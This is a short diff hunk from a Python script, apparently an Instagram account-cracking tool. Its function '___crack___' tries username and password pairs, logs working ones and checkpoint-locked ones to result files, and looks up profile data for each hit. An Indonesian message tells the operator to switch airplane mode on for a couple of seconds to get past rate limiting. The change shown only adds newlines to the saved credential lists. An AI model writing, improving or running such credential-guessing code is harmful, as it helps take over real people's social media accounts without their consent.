@@ -447,7 +447,7 @@ def ___crack___(total,user,pwx):
                 print("%s[>] Username : %s"%(P,user))
                 print("%s[>] Password : %s\n"%(P,pw))
                 ok.append("%s|%s"%(user,pw))
-                open('Results/Ok.txt','a').write("%s|%s"%(user,pw))
+                open('Results/Ok.txt','a').write("%s|%s\n"%(user,pw))
             elif 'checkpoint' in str(req):
                 try:
                     __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
@@ -463,7 +463,7 @@ def ___crack___(total,user,pwx):
                 print("%s[>] Username : %s"%(P,user))
                 print("%s[>] Password : %s\n"%(P,pw))
                 cp.append("%s|%s"%(user,pw))
-                open('Results/Cp.txt','a').write("%s|%s"%(user,pw))
+                open('Results/Cp.txt','a').write("%s|%s\n"%(user,pw))
             elif 'Please wait' in str(req) or 'Try Again Later' in str(req):
                 print("\r%s[%s!%s]%s Hidupkan Mode Pesawat 2 Detik"%(P,M,P,M)),
                 sys.stdout.flush();sleep(5)
